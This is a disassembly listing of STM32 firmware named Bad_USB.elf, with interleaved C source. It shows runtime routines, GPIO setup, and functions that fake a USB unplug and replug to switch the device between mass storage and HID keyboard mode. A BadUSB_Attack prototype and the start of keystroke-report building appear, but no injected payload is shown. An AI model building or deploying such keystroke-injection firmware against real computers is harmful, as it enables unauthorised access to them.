
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000d164  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000238  0800d2f0  0800d2f0  0001d2f0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d528  0800d528  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d528  0800d528  0001d528  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d530  0800d530  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d530  0800d530  0001d530  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d534  0800d534  0001d534  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d538  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d778  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d778  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   00020a9a  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 00005387  00000000  00000000  00040d4d  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b38  00000000  00000000  000460d8  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c7  00000000  00000000  00047c10  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  00026661  00000000  00000000  000490d7  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025b85  00000000  00000000  0006f738  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d2500  00000000  00000000  000952bd  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f70  00000000  00000000  001677c0  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e730  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d2d8 	.word	0x0800d2d8

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d2d8 	.word	0x0800d2d8

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fca0 	bl	8001e80 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 fb28 	bl	8001bac <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 fb1a 	bl	8001bac <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <SimulateUSB_unplug>:
void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]);
void InterruptTrap(int *InterruptFlag);
int TestHID();
void BadUSB_Attack(int stage);

void SimulateUSB_unplug(){
 8000588:	b580      	push	{r7, lr}
 800058a:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_RESET);
 800058c:	2200      	movs	r2, #0
 800058e:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 8000592:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8000596:	f001 fc73 	bl	8001e80 <HAL_GPIO_WritePin>
}
 800059a:	bf00      	nop
 800059c:	bd80      	pop	{r7, pc}

0800059e <SimulateUSB_plugin>:

void SimulateUSB_plugin(){
 800059e:	b580      	push	{r7, lr}
 80005a0:	af00      	add	r7, sp, #0
	HAL_GPIO_WritePin(GPIOA, GPIO_PIN_12, GPIO_PIN_SET);
 80005a2:	2201      	movs	r2, #1
 80005a4:	f44f 5180 	mov.w	r1, #4096	; 0x1000
 80005a8:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 80005ac:	f001 fc68 	bl	8001e80 <HAL_GPIO_WritePin>
}
 80005b0:	bf00      	nop
 80005b2:	bd80      	pop	{r7, pc}

080005b4 <SwitchToHID>:

void SwitchToHID(){
 80005b4:	b580      	push	{r7, lr}
 80005b6:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 80005b8:	f7ff ffe6 	bl	8000588 <SimulateUSB_unplug>
	isMSC = 0;
 80005bc:	4b08      	ldr	r3, [pc, #32]	; (80005e0 <SwitchToHID+0x2c>)
 80005be:	2200      	movs	r2, #0
 80005c0:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 80005c2:	2032      	movs	r0, #50	; 0x32
 80005c4:	f000 ff44 	bl	8001450 <HAL_Delay>
	SimulateUSB_plugin();
 80005c8:	f7ff ffe9 	bl	800059e <SimulateUSB_plugin>
	MX_TIM2_Init();
 80005cc:	f000 fd96 	bl	80010fc <MX_TIM2_Init>
	MX_USB_DEVICE_Init();
 80005d0:	f00c f810 	bl	800c5f4 <MX_USB_DEVICE_Init>
	HAL_Delay(SwitchDeviceSlot);
 80005d4:	f640 30b8 	movw	r0, #3000	; 0xbb8
 80005d8:	f000 ff3a 	bl	8001450 <HAL_Delay>
}
 80005dc:	bf00      	nop
 80005de:	bd80      	pop	{r7, pc}
 80005e0:	20000978 	.word	0x20000978

080005e4 <SwitchToMSC>:

void SwitchToMSC(){
 80005e4:	b580      	push	{r7, lr}
 80005e6:	af00      	add	r7, sp, #0
	SimulateUSB_unplug();
 80005e8:	f7ff ffce 	bl	8000588 <SimulateUSB_unplug>
	isMSC = 1;
 80005ec:	4b07      	ldr	r3, [pc, #28]	; (800060c <SwitchToMSC+0x28>)
 80005ee:	2201      	movs	r2, #1
 80005f0:	601a      	str	r2, [r3, #0]
	HAL_Delay(PlugSlot);
 80005f2:	2032      	movs	r0, #50	; 0x32
 80005f4:	f000 ff2c 	bl	8001450 <HAL_Delay>
	SimulateUSB_plugin();
 80005f8:	f7ff ffd1 	bl	800059e <SimulateUSB_plugin>
	MX_USB_DEVICE_Init_MSC();
 80005fc:	f00c f82a 	bl	800c654 <MX_USB_DEVICE_Init_MSC>
	HAL_Delay(SwitchDeviceSlot);
 8000600:	f640 30b8 	movw	r0, #3000	; 0xbb8
 8000604:	f000 ff24 	bl	8001450 <HAL_Delay>
}
 8000608:	bf00      	nop
 800060a:	bd80      	pop	{r7, pc}
 800060c:	20000978 	.word	0x20000978

08000610 <Get_Single_Descriptor>:

void Get_Single_Descriptor(uint8_t ascii){
 8000610:	b580      	push	{r7, lr}
 8000612:	b0a4      	sub	sp, #144	; 0x90
 8000614:	af00      	add	r7, sp, #0
 8000616:	4603      	mov	r3, r0
 8000618:	71fb      	strb	r3, [r7, #7]
	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 800061a:	220f      	movs	r2, #15
 800061c:	2100      	movs	r1, #0
 800061e:	4821      	ldr	r0, [pc, #132]	; (80006a4 <Get_Single_Descriptor+0x94>)
 8000620:	f00c fe20 	bl	800d264 <memset>
	uint8_t Map[MapLen] = Map_Init;
 8000624:	4a20      	ldr	r2, [pc, #128]	; (80006a8 <Get_Single_Descriptor+0x98>)
 8000626:	f107 0308 	add.w	r3, r7, #8
 800062a:	4611      	mov	r1, r2
 800062c:	2286      	movs	r2, #134	; 0x86
 800062e:	4618      	mov	r0, r3
 8000630:	f00c fe44 	bl	800d2bc <memcpy>
	Convert2CapsMap(Map);
 8000634:	f107 0308 	add.w	r3, r7, #8
 8000638:	4618      	mov	r0, r3
 800063a:	f000 f93f 	bl	80008bc <Convert2CapsMap>
